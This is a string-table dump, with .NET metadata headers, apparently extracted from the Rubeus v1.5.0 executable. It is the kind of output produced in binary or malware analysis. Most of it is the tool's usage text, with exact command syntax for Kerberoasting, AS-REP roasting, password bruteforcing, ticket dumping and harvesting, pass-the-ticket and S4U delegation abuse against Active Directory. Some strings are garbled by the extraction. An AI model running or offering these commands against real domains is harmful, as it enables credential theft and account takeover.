Metadata Signature: 0x125e8 0x10001424a5342 12
.NET Version: v2.0.50727
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 9620
Stream name: #~ 4
DirectoryAddress: 968c Size: 6178
Stream name: #Strings 12
DirectoryAddress: f804 Size: fa6c
Stream name: #US 4
DirectoryAddress: 1f270 Size: 10
Stream name: #GUID 8
DirectoryAddress: 1f280 Size: 2304
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
2659 0x00026f00 0x00428d00 17   35   .text   utf16le [*] Action: S4U\r\n
2660 0x00026f24 0x00428d24 50   101  .text   utf16le [*] Performing cross domain constrained delegation
2661 0x00026f8a 0x00428d8a 28   57   .text   utf16le [*] Loaded a TGS for {0}\{1}
2662 0x00026fc4 0x00428dc4 48   97   .text   utf16le [*] Impersonating user '{0}' to target SPN '{1}'
2663 0x00027026 0x00428e26 58   117  .text   utf16le [*]   Final ticket will be for the alternate service '{0}'
2664 0x0002709c 0x00428e9c 60   121  .text   utf16le [*]   Final tickets will be for the alternate services '{0}'
2665 0x00027116 0x00428f16 49   99   .text   utf16le [*] Building S4U2proxy request for service: '{0}'
2666 0x0002717a 0x00428f7a 29   59   .text   utf16le [*] Sending S4U2proxy request
2667 0x000271b6 0x00428fb6 22   45   .text   utf16le [+] S4U2proxy success!
2668 0x000271e4 0x00428fe4 47   95   .text   utf16le [*] Substituting alternative service name '{0}'
2669 0x00027244 0x00429044 45   91   .text   utf16le [*] base64(ticket.kirbi) for SPN '{0}/{1}':\r\n
2670 0x000272a0 0x004290a0 41   83   .text   utf16le [*] base64(ticket.kirbi) for SPN '{0}':\r\n
2671 0x000272f4 0x004290f4 44   89   .text   utf16le [*] Building S4U2self request for: '{0}@{1}'
2672 0x0002734e 0x0042914e 28   57   .text   utf16le [*] Sending S4U2self request
2673 0x00027388 0x00429188 21   43   .text   utf16le [+] S4U2self success!
2674 0x000273b4 0x004291b4 36   73   .text   utf16le [*] Got a TGS for '{0}' to '{1}@{2}'
2675 0x0002747f 0x0042927f 17   35   .text   utf16le }, KRBTGT service
2676 0x000274a3 0x004292a3 10   21   .text   utf16le krbtgt/{0}
2677 0x000274b9 0x004292b9 45   91   .text   utf16le [*] Retrieving the S4U2Self referral from {0}
2678 0x00027515 0x00429315 43   87   .text   utf16le [*] Requesting the S4U2Self ticket from {0}
2679 0x0002756d 0x0042936d 58   117  .text   utf16le [*] Requesting the cross realm 'S4U2Self' for {0} from {1}
2680 0x000275e3 0x004293e3 40   81   .text   utf16le [*] Sending cross realm S4U2Self request
2681 0x00027635 0x00429435 33   67   .text   utf16le [+] cross realm S4U2Self success!
2682 0x00027679 0x00429479 20   41   .text   utf16le base64(ticket.kirbi)
2683 0x000276a3 0x004294a3 56   113  .text   utf16le [*] Building S4U2proxy request for service: '{0}' on {1}
2684 0x00027715 0x00429515 10   21   .text   utf16le [*] {0}:\r\n
2685 0x0002772b 0x0042952b 15   31   .text   utf16le /consoleoutfile
2686 0x0002774b 0x0042954b 35   71   .text   utf16le \r\n[!] Unhandled Rubeus exception:\r\n
2687 0x00027793 0x00429593 35   71   .text   utf16le Error parsing arguments: ${command}
2688 0x000277db 0x004295db 7    15   .text   utf16le /nowrap
2689 0x000277eb 0x004295eb 16   33   .text   utf16le ^0x[0-9A-Fa-f]+$
2690 0x0002780d 0x0042960d 5    11   .text   utf16le ^\d+$
2691 0x00027819 0x00429619 56   113  .text   utf16le Passed LUID string value is not in a hex or decimal form
2692 0x0002788b 0x0042968b 7    15   .text   utf16le 0x{0:x}
2693 0x0002789b 0x0042969b 22   45   .text   utf16le NTSTAUTS error code 0x
2694 0x000278cd 0x004296cd 22   45   .text   utf16le NTSTATUS error code 0x
2695 0x00027901 0x00429701 42   85   .text   utf16le \r\n   ______        _                      
2696 0x00027957 0x00429757 40   81   .text   utf16le   (_____ \      | |                     
2697 0x000279a9 0x004297a9 40   81   .text   utf16le    _____) )_   _| |__  _____ _   _  ___ 
2698 0x000279fb 0x004297fb 40   81   .text   utf16le   |  __  /| | | |  _ \| ___ | | | |/___)
2699 0x00027a4d 0x0042984d 40   81   .text   utf16le   | |  \ \| |_| | |_) ) ____| |_| |___ |
2700 0x00027a9f 0x0042989f 41   83   .text   utf16le   |_|   |_|____/|____/|_____)____/(___/\r\n
2701 0x00027af3 0x004298f3 11   23   .text   utf16le   v1.5.0 \r\n
2702 0x00027b0e 0x0042990e 1989 3980 .text   utf16le \r\n Ticket requests and renewals:\r\n\r\n    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:\r\n        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]\r\n\r\n    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:\r\n        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]\r\n\r\n    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:\r\n        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]\r\n\r\n    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:\r\n        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]\r\n\r\n    Perform a Kerberos-based password bruteforcing attack:\r\n        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]\r\n\r\n\r\n Constrained delegation abuse:\r\n\r\n    Perform S4U constrained delegation abuse:\r\n        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
2703 0x00028a9a 0x0042a89a 1979 3958 .text   utf16le \n        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]\r\n\r\n    Perform S4U constrained delegation abuse across domains:\r\n        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap]\r\n\r\n\r\n Ticket management:\r\n\r\n    Submit a TGT, optionally targeting a specific LUID (if elevated):\r\n        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]\r\n\r\n    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):\r\n        Rubeus.exe purge [/luid:LOGINID]\r\n\r\n    Parse and describe a ticket (service ticket or TGT):\r\n        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>\r\n\r\n\r\n Ticket extraction and harvesting:\r\n\r\n    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:\r\n        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]\r\n\r\n    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:\r\n        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]\r\n\r\n    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:\r\n        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]\r\n\r\n    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:\r\n        Rubeus.exe tgtdeleg [/target:SPN]\r\n\r\n    Monitor every /interval SECONDS (default 60) for new 
2704 0x00029a10 0x0042b810 1977 3954 .text   utf16le TGTs:\r\n        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]\r\n\r\n    Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):\r\n        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]\r\n\r\n\r\n Roasting:\r\n\r\n    Perform Kerberoasting:\r\n        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]\r\n\r\n    Perform Kerberoasting, outputting hashes to a file:\r\n        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]\r\n\r\n    Perform Kerberoasting, outputting hashes in the file output format, but to the console:\r\n        Rubeus.exe kerberoast /simple [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]\r\n\r\n    Perform Kerberoasting with alternate credentials:\r\n        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]\r\n\r\n    Perform Kerberoasting with an existing TGT:\r\n        Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]\r\n\r\n    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:\r\n        Rubeus.exe kerberoast /usetgtdeleg [/nowrap]\r\n\r\n    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:\r\n        Rubeus.exe kerberoast /rc4opsec [/nowrap]\r\n\r\n    List statistics about found Kerberoastable accounts without actually sending ticket requests:\r\n        Rubeus.exe kerberoast /stats [/nowrap]\r\n\r\n    Perform Kerberoasting, requesting tickets only for accounts with an 
2705 0x0002a982 0x0042c782 1976 3952 .text   utf16le admin count of 1 (custom LDAP filter):\r\n        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap]\r\n\r\n    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:\r\n        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]\r\n        \r\n    Perform AES Kerberoasting:\r\n        Rubeus.exe kerberoast /aes [/nowrap]\r\n\r\n    Perform AS-REP "roasting" for any users without preauth:\r\n        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]\r\n\r\n    Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:\r\n        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]\r\n\r\n    Perform AS-REP "roasting" for any users without preauth using alternate credentials:\r\n        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/nowrap]\r\n\r\n\r\n Miscellaneous:\r\n\r\n    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:\r\n        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]\r\n\r\n    Reset a user's password from a supplied TGT (AoratoPw):\r\n        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]\r\n\r\n    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:\r\n        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]\r\n\r\n    Substitute an sname or SPN into an existing service ticket:\r\n        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]\r\n        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/no
2706 0x0002b8f2 0x0042d6f2 430  862  .text   utf16le wrap]\r\n    \r\n    Display the current user's LUID:\r\n        Rubeus.exe currentluid\r\n\r\n    The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.\r\n\r\n    The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.\r\n\r\n\r\n NOTE: Base64 ticket blobs can be decoded with :\r\n\r\n    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))\r\n\r\n
2707 0x0002bc50 0x0042da50 6    13   .text   utf16le asktgs
2708 0x0002bc5e 0x0042da5e 21   43   .text   utf16le [*] Action: Ask TGS\r\n
2709 0x0002bc8a 0x0042da8a 8    17   .text   utf16le /outfile
2710 0x0002bc9c 0x0042da9c 4    9    .text   utf16le /ptt
2711 0x0002bca6 0x0042daa6 11   23   .text   utf16le /enterprise
2712 0x0002bcc6 0x0042dac6 8    17   .text   utf16le /enctype
2713 0x0002bce0 0x0042dae0 4    10   .text   utf16le NTLM
2714 0x0002bcea 0x0042daea 6    14   .text   utf16le AES128
2715 0x0002bcf8 0x0042daf8 6    13   .text   utf16le AES256
2716 0x0002bd16 0x0042db16 23   47   .text   utf16le Unsupported etype : {0}
2717 0x0002bd46 0x0042db46 25   52   .text   utf16le /service耀宙堀崀 伀渀攀 漀爀 洀漀爀攀  blocks=Basic Latin,CJK Unified Ideographs,General Punctuation
2718 0x0002bd7b 0x0042db7b 59   119  .text   utf16le /service:sname/server.domain.com' specifications are needed
2719 0x0002bdf3 0x0042dbf3 7    15   .text   utf16le /ticket
2720 0x0002be04 0x0042dc04 73   147  .text   utf16le \r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n
2721 0x0002be98 0x0042dc98 41   84   .text   utf16le \r\n[X] A /ticket:X needs to be supplied!\r\n
2722 0x0002beec 0x0042dcec 6    13   .text   utf16le asktgt
2723 0x0002befa 0x0042dcfa 21   44   .text   utf16le [*] Action: Ask TGT\r\n
2724 0x0002bf26 0x0042dd26 5    11   .text   utf16le /user
2725 0x0002bf32 0x0042dd32 7    15   .text   utf16le /domain
2726 0x0002bf42 0x0042dd42 9    19   .text   utf16le /password
2727 0x0002bf56 0x0042dd56 4    9    .text   utf16le /des
2728 0x0002bf60 0x0042dd60 4    10   .text   utf16le /rc4
2729 0x0002bf6a 0x0042dd6a 5    11   .text   utf16le /ntlm
2730 0x0002bf76 0x0042dd76 7    15   .text   utf16le /aes128
2731 0x0002bf86 0x0042dd86 7    16   .text   utf16le /aes256
2732 0x0002bf96 0x0042dd96 5    11   .text   utf16le /luid
2733 0x0002bfa2 0x0042dda2 31   63   .text   utf16le [X] Invalid LUID format ({0})\r\n
2734 0x0002bfe2 0x0042dde2 94   190  .text   utf16le /createnetonly耀実堀崀 夀漀甀 渀攀攀搀 琀漀 戀攀 椀渀 栀椀最栀 椀渀琀攀最爀椀琀礀 琀漀 愀瀀瀀氀礀 愀 琀椀挀欀攀琀 琀漀 挀爀攀愀琀攀搀 氀漀最漀渀 猀攀猀猀椀漀渀 blocks=Basic Latin,CJK Unified Ideographs,General Punctuation
2735 0x0002c0a1 0x0042dea1 5    11   .text   utf16le /show
2736 0x0002c0ad 0x0042dead 36   73   .text   utf16le \r\n[X] You must supply a user name!\r\n
2737 0x0002c0f8 0x0042def8 76   153  .text   utf16le \r\n[X] You must supply a /password , or a [/des|/rc4|/aes128|/aes256] hash!\r\n
2738 0x0002c193 0x0042df93 73   147  .text   utf16le \r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n
2739 0x0002c227 0x0042e027 10   21   .text   utf16le asreproast
2740 0x0002c23d 0x0042e03d 31   63   .text   utf16le \r\n[*] Action: AS-REP roasting\r\n
2741 0x0002c285 0x0042e085 11   23   .text   utf16le /ldapfilter
2742 0x0002c29d 0x0042e09d 7    15   .text   utf16le /format
2743 0x0002c2ad 0x0042e0ad 9    20   .text   utf16le /creduser
2744 0x0002c2c1 0x0042e0c1 5    11   .text   utf16le .+\.+
2745 0x0002c2ce 0x0042e0ce 72   145  .text   utf16le \r\n[X] /creduser specification must be in fqdn format (domain.com\user)\r\n
2746 0x0002c360 0x0042e160 13   27   .text   utf16le /credpassword
2747 0x0002c37c 0x0042e17c 59   120  .text   utf16le \r\n[X] /credpassword is required when specifying /creduser\r\n
2748 0x0002c3f4 0x0042e1f4 5    11   .text   utf16le brute
2749 0x0002c400 0x0042e200 50   101  .text   utf16le \r\n[+] Done: Credentials should be saved in "{0}"\r\n
2750 0x0002c466 0x0042e266 12   25   .text   utf16le \r\n[+] Done\r\n
2751 0x0002c480 0x0042e280 48   97   .text   utf16le \r\n[-] Done: No credentials were discovered :'(\r\n
2752 0x0002c4e3 0x0042e2e3 68   137  .text   utf16le [X] /creduser specification must be in fqdn format (domain.com\user)
2753 0x0002c56d 0x0042e36d 55   111  .text   utf16le [X] /credpassword is required when specifying /creduser
2754 0x0002c5dd 0x0042e3dd 10   21   .text   utf16le /passwords
2755 0x0002c5f3 0x0042e3f3 35   71   .text   utf16le [X] Unable to open passwords file "
2756 0x0002c63b 0x0042e43b 17   35   .text   utf16le ": Not found file
2757 0x0002c660 0x0042e460 77   156  .text   utf16le [X] You must supply a password! Use /password:<password> or /passwords:<file>
2758 0x0002c6fc 0x0042e4fc 6    13   .text   utf16le /users
2759 0x0002c70a 0x0042e50a 31   63   .text   utf16le [X] Unable to open users file "
2760 0x0002c74a 0x0042e54a 8    17   .text   utf16le /verbose
2761 0x0002c75c 0x0042e55c 9    19   .text   utf16le /noticket
2762 0x0002c770 0x0042e570 30   61   .text   utf16le [X] Credentials supplied for '
2763 0x0002c7ae 0x0042e5ae 14   29   .text   utf16le ' are invalid!
2764 0x0002c7cc 0x0042e5cc 34   69   .text   utf16le [*] Using alternate creds  : {0}\r\n
2765 0x0002c812 0x0042e612 26   53   .text   utf16le (samAccountType=805306368)
2766 0x0002c848 0x0042e648 51   103  .text   utf16le [X] Login error when retrieving usernames from dc "
2767 0x0002c8b0 0x0042e6b0 56   113  .text   utf16le "! Try it by providing valid /creduser and /credpassword
2768 0x0002c922 0x0042e722 34   69   .text   utf16le [X] Error connecting with the dc "
2769 0x0002c968 0x0042e768 51   103  .text   utf16le "! Make sure that provided /domain or /dc are valid
2770 0x0002c9d1 0x0042e7d1 69   139  .text   utf16le [X] Invalid syntax in DN specification! Make sure that /ou is correct
2771 0x0002ca5e 0x0042e85e 72   145  .text   utf16le [X] There is no such object on the server! Make sure that /ou is correct
2772 0x0002caf1 0x0042e8f1 65   131  .text   utf16le [X] Unable to find DC address! Try it by providing /domain or /dc
2773 0x0002cb75 0x0042e975 10   21   .text   utf16le {0}/DC={1}
2774 0x0002cb8b 0x0042e98b 25   51   .text   utf16le [+] STUPENDOUS => {0}:{1}
2775 0x0002cbbf 0x0042e9bf 21   43   .text   utf16le [+] Valid user => {0}
2776 0x0002cbeb 0x0042e9eb 23   47   .text   utf16le [-] Invalid user => {0}
2777 0x0002cc1b 0x0042ea1b 32   65   .text   utf16le [-] Blocked/Disabled user => {0}
2778 0x0002cc5d 0x0042ea5d 33   67   .text   utf16le \r\n[X] {0} KRB-ERROR ({1}) : {2}\r\n
2779 0x0002cca1 0x0042eaa1 10   21   .text   utf16le {0}:{1}{2}
2780 0x0002ccb7 0x0042eab7 55   112  .text   utf16le [X] Unable to write credentials in "{0}": Access denied
2781 0x0002cd27 0x0042eb27 6    13   .text   utf16le .kirbi
2782 0x0002cd35 0x0042eb35 22   46   .text   utf16le [*] Saved TGT into {0}
2783 0x0002cd63 0x0042eb63 24   49   .text   utf16le [*] base64({0}.kirbi):\r\n
2784 0x0002cd95 0x0042eb95 8    17   .text   utf16le changepw
2785 0x0002cda7 0x0042eba7 44   89   .text   utf16le [*] Action: Reset User Password (AoratoPw)\r\n
2786 0x0002ce01 0x0042ec01 4    9    .text   utf16le /new
2787 0x0002ce0b 0x0042ec0b 51   103  .text   utf16le \r\n[X] New password must be supplied with /new:X !\r\n
2788 0x0002ce74 0x0042ec74 72   145  .text   utf16le \r\n[X]/ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n
2789 0x0002cf06 0x0042ed06 13   27   .text   utf16le createnetonly
2790 0x0002cf22 0x0042ed22 41   83   .text   utf16le \r\n[*] Action: Create Process (/netonly)\r\n
2791 0x0002cf76 0x0042ed76 8    17   .text   utf16le /program
2792 0x0002cf88 0x0042ed88 40   81   .text   utf16le \r\n[X] A /program needs to be supplied!\r\n
2793 0x0002cfda 0x0042edda 11   23   .text   utf16le currentluid
2794 0x0002cff2 0x0042edf2 36   73   .text   utf16le \r\n[*] Action: Display current LUID\r\n
2795 0x0002d03c 0x0042ee3c 40   81   .text   utf16le [*] Current LogonID (LUID) : {0} ({1})\r\n
2796 0x0002d08e 0x0042ee8e 8    17   .text   utf16le describe
2797 0x0002d0a0 0x0042eea0 31   63   .text   utf16le \r\n[*] Action: Describe Ticket\r\n
2798 0x0002d0e0 0x0042eee0 4    9    .text   utf16le dump
2799 0x0002d0ea 0x0042eeea 49   99   .text   utf16le \r\nAction: Dump Kerberos Ticket Data (All Users)\r\n
2800 0x0002d14e 0x0042ef4e 52   105  .text   utf16le \r\nAction: Dump Kerberos Ticket Data (Current User)\r\n
2801 0x0002d1b8 0x0042efb8 7    15   .text   utf16le /server
2802 0x0002d1c8 0x0042efc8 7    15   .text   utf16le harvest
2803 0x0002d1d8 0x0042efd8 46   93   .text   utf16le [*] Action: TGT Harvesting (with auto-renewal)
2804 0x0002d236 0x0042f036 11   23   .text   utf16le /filteruser
2805 0x0002d24e 0x0042f04e 11   23   .text   utf16le /targetuser
2806 0x0002d266 0x0042f066 9    19   .text   utf16le /interval
2807 0x0002d27a 0x0042f07a 16   33   .text   utf16le /monitorinterval
2808 0x0002d29c 0x0042f09c 16   33   .text   utf16le /displayinterval
2809 0x0002d2be 0x0042f0be 9    19   .text   utf16le /registry
2810 0x0002d2d2 0x0042f0d2 7    15   .text   utf16le /runfor
2811 0x0002d2e2 0x0042f0e2 45   91   .text   utf16le [*] Monitoring every {0} seconds for new TGTs
2812 0x0002d33e 0x0042f13e 54   109  .text   utf16le [*] Displaying the working TGT cache every {0} seconds
2813 0x0002d3ac 0x0042f1ac 38   77   .text   utf16le [*] Running collection for {0} seconds
2814 0x0002d3fa 0x0042f1fa 4    9    .text   utf16le hash
2815 0x0002d404 0x0042f204 43   87   .text   utf16le \r\n[*] Action: Calculate Password Hash(es)\r\n
2816 0x0002d45c 0x0042f25c 33   67   .text   utf16le [X] /password:X must be supplied!
2817 0x0002d4a0 0x0042f2a0 10   21   .text   utf16le kerberoast
2818 0x0002d4b6 0x0042f2b6 29   59   .text   utf16le \r\n[*] Action: Kerberoasting\r\n
2819 0x0002d4f2 0x0042f2f2 4    10   .text   utf16le /spn
2820 0x0002d4fc 0x0042f2fc 5    11   .text   utf16le /spns
2821 0x0002d508 0x0042f308 7    15   .text   utf16le /simple
2822 0x0002d518 0x0042f318 4    9    .text   utf16le /aes
2823 0x0002d522 0x0042f322 9    19   .text   utf16le /rc4opsec
2824 0x0002d536 0x0042f336 12   25   .text   utf16le /usetgtdeleg
2825 0x0002d550 0x0042f350 9    19   .text   utf16le /tgtdeleg
2826 0x0002d564 0x0042f364 12   25   .text   utf16le /pwdsetafter
2827 0x0002d57e 0x0042f37e 13   27   .text   utf16le /pwdsetbefore
2828 0x0002d59a 0x0042f39a 12   26   .text   utf16le /resultlimit
2829 0x0002d5b4 0x0042f3b4 6    14   .text   utf16le /stats
2830 0x0002d5c2 0x0042f3c2 5    11   .text   utf16le klist
2831 0x0002d5ce 0x0042f3ce 45   91   .text   utf16le \r\nAction: List Kerberos Tickets (All Users)\r\n
2832 0x0002d62a 0x0042f42a 48   97   .text   utf16le \r\nAction: List Kerberos Tickets (Current User)\r\n
2833 0x0002d68c 0x0042f48c 7    15   .text   utf16le monitor
2834 0x0002d69c 0x0042f49c 26   53   .text   utf16le [*] Action: TGT Monitoring
2835 0x0002d6da 0x0042f4da 27   56   .text   utf16le \r\n[*] Action: Import Ticket
2836 0x0002d712 0x0042f512 5    11   .text   utf16le purge
2837 0x0002d71e 0x0042f51e 27   55   .text   utf16le \r\n[*] Action: Purge Tickets
2838 0x0002d756 0x0042f556 9    20   .text   utf16le Luid: {0}
2839 0x0002d76a 0x0042f56a 5    11   .text   utf16le renew
2840 0x0002d776 0x0042f576 10   21   .text   utf16le /autorenew
2841 0x0002d78c 0x0042f58c 31   63   .text   utf16le [*] Action: Auto-Renew Ticket\r\n
2842 0x0002d7cc 0x0042f5cc 26   53   .text   utf16le [*] Action: Renew Ticket\r\n
2843 0x0002d80a 0x0042f60a 16   33   .text   utf16le /impersonateuser
2844 0x0002d82c 0x0042f62c 4    9    .text   utf16le /tgs
2845 0x0002d837 0x0042f637 74   149  .text   utf16le \r\n[X] You must supply either a /impersonateuser or a /tgs, but not both.\r\n
2846 0x0002d8cd 0x0042f6cd 18   37   .text   utf16le /impersonatedomain
2847 0x0002d8f3 0x0042f6f3 13   27   .text   utf16le /targetdomain
2848 0x0002d90f 0x0042f70f 9    19   .text   utf16le /targetdc
2849 0x0002d923 0x0042f723 8    17   .text   utf16le /msdsspn
2850 0x0002d935 0x0042f735 11   24   .text   utf16le /altservice
2851 0x0002d94d 0x0042f74d 5    11   .text   utf16le /self
2852 0x0002d95a 0x0042f75a 70   141  .text   utf16le \r\n[X] /tgs:X must either be a .kirbi file or a base64 encoded .kirbi\r\n
2853 0x0002d9e8 0x0042f7e8 46   93   .text   utf16le \r\n[X] You must supply a /tgs to impersonate!\r\n
2854 0x0002da47 0x0042f847 73   147  .text   utf16le [X] Alternatively, supply a /impersonateuser to perform S4U2Self first.\r\n
2855 0x0002dadc 0x0042f8dc 64   129  .text   utf16le \r\n[X] If a /tgs is supplied, you must also supply a /msdsspn !\r\n
2856 0x0002db5e 0x0042f95e 47   95   .text   utf16le \r\n[X] You must supply a /rc4 or /aes256 hash!\r\n
2857 0x0002dbbe 0x0042f9be 49   99   .text   utf16le \r\n[X] A /ticket:X needs to be supplied for S4U!\r\n
2858 0x0002dc23 0x0042fa23 90   182  .text   utf16le [X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n
